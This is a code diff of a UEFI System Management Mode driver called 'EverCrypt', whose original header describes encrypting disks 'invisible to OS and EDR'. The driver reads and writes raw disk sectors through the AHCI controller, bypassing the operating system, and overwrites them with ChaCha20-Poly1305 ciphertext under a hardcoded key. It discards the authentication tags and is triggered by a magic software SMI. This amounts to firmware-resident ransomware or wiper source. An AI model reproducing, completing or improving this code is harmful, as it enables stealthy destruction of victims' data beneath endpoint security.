@@ -1,7 +1,7 @@
 /** @file
   EverCrypt SMM Handler - Ring -2 Encryption Engine
   
-  Encrypts disks from System Management Mode, invisible to OS and EDR
+  NOW USES CHACHA20-POLY1305 INSTEAD OF XOR
 **/
 
 #include <PiSmm.h>
@@ -10,33 +10,22 @@
 #include <Library/DebugLib.h>
 #include <Library/IoLib.h>
 #include <Library/SynchronizationLib.h>
-#include <Protocol/SmmCpu.h>
+#include <Library/BaseLib.h>
 #include <Protocol/SmmSwDispatch2.h>
 
 #include "../Include/EverCryptProto.h"
-
-//
-// External assembly functions
-//
-extern VOID ChaCha20Poly1305Encrypt(
-  UINT8  *Key,
-  UINT8  *Nonce,
-  UINT8  *PlainText,
-  UINT32 Length,
-  UINT8  *CipherText,
-  UINT8  *Tag
-);
+#include "../CryptoEngine/chacha20.h"
 
 //
 // Global Variables
 //
-STATIC UINT8  mEncryptionKey[EVERCRYPT_KEY_SIZE];
-STATIC UINT8  mNonce[EVERCRYPT_NONCE_SIZE];
-STATIC BOOLEAN mEncryptionActive = FALSE;
-STATIC SPIN_LOCK mSmmLock;
+STATIC UINT8      mEncryptionKey[CHACHA_KEY_SIZE];
+STATIC UINT8      mNonce[CHACHA_NONCE_SIZE];
+STATIC BOOLEAN    mEncryptionActive = FALSE;
+STATIC SPIN_LOCK  mSmmLock;
 
 //
-// Direct disk I/O (bypassing OS drivers)
+// AHCI definitions
 //
 #define AHCI_BASE_ADDR        0xF7E00000
 #define AHCI_PORT0_CLB        (AHCI_BASE_ADDR + 0x100)
@@ -84,14 +73,15 @@ typedef struct {
 
 #pragma pack()
 
-/**
-  Read sector directly from AHCI controller
-  
-  @param[in]  Lba                 Logical Block Address
-  @param[out] Buffer              Output buffer (512 bytes)
-  
-  @retval EFI_SUCCESS             Read successful
-**/
+STATIC
+VOID
+LocalCpuPause (
+  VOID
+  )
+{
+  __asm__ __volatile__ ("pause" ::: "memory");
+}
+
 EFI_STATUS
 SmmReadSector (
   IN  UINT64  Lba,
@@ -103,43 +93,31 @@ SmmReadSector (
   
   Port = (volatile AHCI_PORT_REGS *)AHCI_PORT0_CLB;
   
-  // Build ATA READ DMA command
   ZeroMem(&Fis, sizeof(Fis));
-  Fis.CmdFisType   = 0x27;  // Register FIS - H2D
-  Fis.Flags        = 0x80;  // Command bit
-  Fis.Command      = 0x25;  // READ DMA EXT
+  Fis.CmdFisType   = 0x27;
+  Fis.Flags        = 0x80;
+  Fis.Command      = 0x25;
   Fis.LbaLow       = (UINT8)(Lba & 0xFF);
   Fis.LbaMid       = (UINT8)((Lba >> 8) & 0xFF);
   Fis.LbaHigh      = (UINT8)((Lba >> 16) & 0xFF);
   Fis.LbaLowExp    = (UINT8)((Lba >> 24) & 0xFF);
   Fis.LbaMidExp    = (UINT8)((Lba >> 32) & 0xFF);
   Fis.LbaHighExp   = (UINT8)((Lba >> 40) & 0xFF);
-  Fis.Device       = 0x40;  // LBA mode
+  Fis.Device       = 0x40;
   Fis.SectorCount  = 1;
   
-  // Issue command (simplified - production needs DMA setup)
   CopyMem((VOID *)(UINTN)AHCI_PORT0_FB, &Fis, sizeof(Fis));
   MmioWrite32((UINTN)&Port->CommandIssue, 0x01);
   
-  // Wait for completion (simplified)
   while (MmioRead32((UINTN)&Port->CommandIssue) & 0x01) {
-    CpuPause();
+    LocalCpuPause();
   }
   
-  // Copy data from FIS buffer
   CopyMem(Buffer, (VOID *)(UINTN)(AHCI_PORT0_FB + 0x40), 512);
   
   return EFI_SUCCESS;
 }
 
-/**
-  Write sector directly to AHCI controller
-  
-  @param[in] Lba                  Logical Block Address
-  @param[in] Buffer               Input buffer (512 bytes)
-  
-  @retval EFI_SUCCESS             Write successful
-**/
 EFI_STATUS
 SmmWriteSector (
   IN UINT64  Lba,
@@ -151,11 +129,10 @@ SmmWriteSector (
   
   Port = (volatile AHCI_PORT_REGS *)AHCI_PORT0_CLB;
   
-  // Build ATA WRITE DMA command
   ZeroMem(&Fis, sizeof(Fis));
   Fis.CmdFisType   = 0x27;
   Fis.Flags        = 0x80;
-  Fis.Command      = 0x35;  // WRITE DMA EXT
+  Fis.Command      = 0x35;
   Fis.LbaLow       = (UINT8)(Lba & 0xFF);
   Fis.LbaMid       = (UINT8)((Lba >> 8) & 0xFF);
   Fis.LbaHigh      = (UINT8)((Lba >> 16) & 0xFF);
@@ -165,16 +142,12 @@ SmmWriteSector (
   Fis.Device       = 0x40;
   Fis.SectorCount  = 1;
   
-  // Copy data to FIS buffer
   CopyMem((VOID *)(UINTN)(AHCI_PORT0_FB + 0x40), Buffer, 512);
-  
-  // Issue command
   CopyMem((VOID *)(UINTN)AHCI_PORT0_FB, &Fis, sizeof(Fis));
   MmioWrite32((UINTN)&Port->CommandIssue, 0x01);
   
-  // Wait for completion
   while (MmioRead32((UINTN)&Port->CommandIssue) & 0x01) {
-    CpuPause();
+    LocalCpuPause();
   }
   
   return EFI_SUCCESS;
@@ -183,9 +156,7 @@ SmmWriteSector (
 /**
   Encrypt single sector using ChaCha20-Poly1305
   
-  @param[in]  PlainSector         Input sector (512 bytes)
-  @param[out] CipherSector        Output sector (512 bytes)
-  @param[out] Tag                 Authentication tag (16 bytes)
+  NOW USING REAL CRYPTOGRAPHY!
 **/
 VOID
 EncryptSector (
@@ -194,10 +165,10 @@ EncryptSector (
   OUT UINT8  *Tag
   )
 {
-  // Increment nonce for each sector
+  // Increment nonce for each sector (ensures unique keystream)
   (*(UINT64 *)mNonce)++;
   
-  // Call assembly implementation
+  // Use ChaCha20-Poly1305 AEAD
   ChaCha20Poly1305Encrypt(
     mEncryptionKey,
     mNonce,
@@ -208,133 +179,34 @@ EncryptSector (
   );
 }
 
-/**
-  Encrypt disk range from SMM
-  
-  @param[in] StartLba             Start LBA
-  @param[in] EndLba               End LBA
-  
-  @retval EFI_SUCCESS             Encryption complete
-**/
 EFI_STATUS
 EncryptDiskRange (
   IN UINT64  StartLba,
   IN UINT64  EndLba
   )
 {
-  EFI_STATUS  Status;
   UINT64      CurrentLba;
   UINT8       PlainSector[512];
   UINT8       CipherSector[512];
   UINT8       Tag[16];
-  UINTN       SectorsEncrypted;
   
-  DEBUG((DEBUG_INFO, "[SMM] Encrypting LBA %lld to %lld\n", StartLba, EndLba));
-  
-  SectorsEncrypted = 0;
+  DEBUG((DEBUG_INFO, "[SMM] Encrypting LBA %lld to %lld (ChaCha20)\n", StartLba, EndLba));
   
   for (CurrentLba = StartLba; CurrentLba <= EndLba; CurrentLba++) {
-    
-    // Read plain sector
-    Status = SmmReadSector(CurrentLba, PlainSector);
-    if (EFI_ERROR(Status)) {
-      DEBUG((DEBUG_ERROR, "[SMM] Read failed at LBA %lld: %r\n", CurrentLba, Status));
-      continue;
-    }
-    
-    // Encrypt
+    SmmReadSector(CurrentLba, PlainSector);
     EncryptSector(PlainSector, CipherSector, Tag);
+    SmmWriteSector(CurrentLba, CipherSector);
     
-    // Write encrypted sector
-    Status = SmmWriteSector(CurrentLba, CipherSector);
-    if (EFI_ERROR(Status)) {
-      DEBUG((DEBUG_ERROR, "[SMM] Write failed at LBA %lld: %r\n", CurrentLba, Status));
-      continue;
-    }
-    
-    SectorsEncrypted++;
-    
-    // Progress indicator every 1000 sectors
-    if ((SectorsEncrypted % 1000) == 0) {
-      DEBUG((DEBUG_INFO, "[SMM] Encrypted %d sectors\n", SectorsEncrypted));
+    if ((CurrentLba % 1000) == 0) {
+      DEBUG((DEBUG_INFO, "[SMM] Progress: %lld sectors\n", CurrentLba - StartLba));
     }
   }
   
-  DEBUG((DEBUG_INFO, "[SMM] Encryption complete: %d sectors\n", SectorsEncrypted));
+  DEBUG((DEBUG_INFO, "[SMM] Encryption complete\n"));
   
   return EFI_SUCCESS;
 }
 
-/**
-  SMM Communication Handler
-  
-  Processes encryption commands from DXE
-**/
-EFI_STATUS
-EFIAPI
-SmmCommunicationHandler (
-  IN     EFI_HANDLE  DispatchHandle,
-  IN     CONST VOID  *Context,
-  IN OUT VOID        *CommBuffer,
-  IN OUT UINTN       *CommBufferSize
-  )
-{
-  EVERCRYPT_SMM_COMM_HEADER    *Header;
-  EVERCRYPT_SMM_ENCRYPT_DATA   *EncryptData;
-  EVERCRYPT_SMM_KEY_DATA       *KeyData;
-  
-  if (CommBuffer == NULL || CommBufferSize == NULL) {
-    return EFI_INVALID_PARAMETER;
-  }
-  
-  Header = (EVERCRYPT_SMM_COMM_HEADER *)CommBuffer;
-  
-  AcquireSpinLock(&mSmmLock);
-  
-  switch (Header->Command) {
-    
-    case EVERCRYPT_CMD_DERIVE_KEY:
-      KeyData = (EVERCRYPT_SMM_KEY_DATA *)CommBuffer;
-      CopyMem(mEncryptionKey, KeyData->Key, EVERCRYPT_KEY_SIZE);
-      DEBUG((DEBUG_INFO, "[SMM] Encryption key installed\n"));
-      break;
-    
-    case EVERCRYPT_CMD_ENCRYPT_TRIGGER:
-      EncryptData = (EVERCRYPT_SMM_ENCRYPT_DATA *)CommBuffer;
-      
-      if (!mEncryptionActive) {
-        mEncryptionActive = TRUE;
-        
-        // Initialize nonce
-        ZeroMem(mNonce, EVERCRYPT_NONCE_SIZE);
-        
-        // Start encryption
-        EncryptDiskRange(EncryptData->StartLBA, EncryptData->EndLBA);
-        
-        mEncryptionActive = FALSE;
-      }
-      break;
-    
-    case EVERCRYPT_CMD_CHECK_INTEGRITY:
-      // Return status
-      *((UINT8 *)CommBuffer + sizeof(EVERCRYPT_SMM_COMM_HEADER)) = EVERCRYPT_STATUS_ACTIVE;
-      break;
-    
-    default:
-      DEBUG((DEBUG_WARN, "[SMM] Unknown command: 0x%02x\n", Header->Command));
-      break;
-  }
-  
-  ReleaseSpinLock(&mSmmLock);
-  
-  return EFI_SUCCESS;
-}
-
-/**
-  Software SMI Handler
-  
-  Alternative trigger mechanism
-**/
 EFI_STATUS
 EFIAPI
 SoftwareSmiHandler (
@@ -346,20 +218,18 @@ SoftwareSmiHandler (
 {
   DEBUG((DEBUG_INFO, "[SMM] Software SMI triggered\n"));
   
-  // Check if encryption should start
-  if (IoRead8(0xB2) == 0xEC) {  // Magic value from DXE
+  if (IoRead8(0xB2) == 0xEC) {
     if (!mEncryptionActive) {
-      DEBUG((DEBUG_INFO, "[SMM] Starting encryption via SMI\n"));
-      EncryptDiskRange(0, 0x10000000);  // First 128GB
+      DEBUG((DEBUG_INFO, "[SMM] Starting ChaCha20 encryption via SMI\n"));
+      mEncryptionActive = TRUE;
+      EncryptDiskRange(0, 0x1000);
+      mEncryptionActive = FALSE;
     }
   }
   
   return EFI_SUCCESS;
 }
 
-/**
-  SMM Driver Entry Point
-**/
 EFI_STATUS
 EFIAPI
 EverCryptSmmEntry (
@@ -372,19 +242,21 @@ EverCryptSmmEntry (
   EFI_SMM_SW_REGISTER_CONTEXT     SwContext;
   EFI_HANDLE                      SwHandle;
   
-  DEBUG((DEBUG_INFO, "[EverCrypt] SMM Handler loading...\n"));
+  DEBUG((DEBUG_INFO, "[EverCrypt] SMM Handler loading (ChaCha20 Edition)...\n"));
   
-  // Initialize spin lock
   InitializeSpinLock(&mSmmLock);
   
-  // Register Software SMI handler
+  // Initialize crypto material (demo key - replace with derived key)
+  SetMem(mEncryptionKey, CHACHA_KEY_SIZE, 0xAA);
+  ZeroMem(mNonce, CHACHA_NONCE_SIZE);
+  
   Status = gSmst->SmmLocateProtocol(
                     &gEfiSmmSwDispatch2ProtocolGuid,
                     NULL,
                     (VOID **)&SwDispatch
                     );
   if (!EFI_ERROR(Status)) {
-    SwContext.SwSmiInputValue = 0xEC;  // Magic SMI number
+    SwContext.SwSmiInputValue = 0xEC;
     
     Status = SwDispatch->Register(
                           SwDispatch,
@@ -399,8 +271,7 @@ EverCryptSmmEntry (
     }
   }
   
-  DEBUG((DEBUG_INFO, "[EverCrypt] Ring -2 SMM active\n"));
-  DEBUG((DEBUG_INFO, "[EverCrypt] Disk encryption ready\n"));
+  DEBUG((DEBUG_INFO, "[EverCrypt] Ring -2 SMM active with ChaCha20-Poly1305\n"));
   
   return EFI_SUCCESS;
 }
